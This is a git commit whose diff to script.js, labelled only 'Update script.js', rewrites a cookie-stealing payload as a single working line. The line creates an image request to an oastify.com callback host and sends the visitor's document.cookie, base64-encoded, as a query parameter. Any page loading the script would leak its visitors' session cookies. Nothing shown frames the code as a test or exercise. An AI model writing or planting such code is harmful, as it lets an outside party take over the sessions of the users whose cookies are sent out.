96868c5f8fae0ed3b01ebdb75c28f660fca094d4
Jobzz99 <147684323+Jobzz99@users.noreply.github.com>
2025-08-12 15:00:13 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://znqeb2sbmf1o8tliy50skyhodfj67zvo.oastify.com/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxx?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://znqeb2sbmf1o8tliy50skyhodfj67zvo.oastify.com/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxx?data='+btoa(document.cookie);
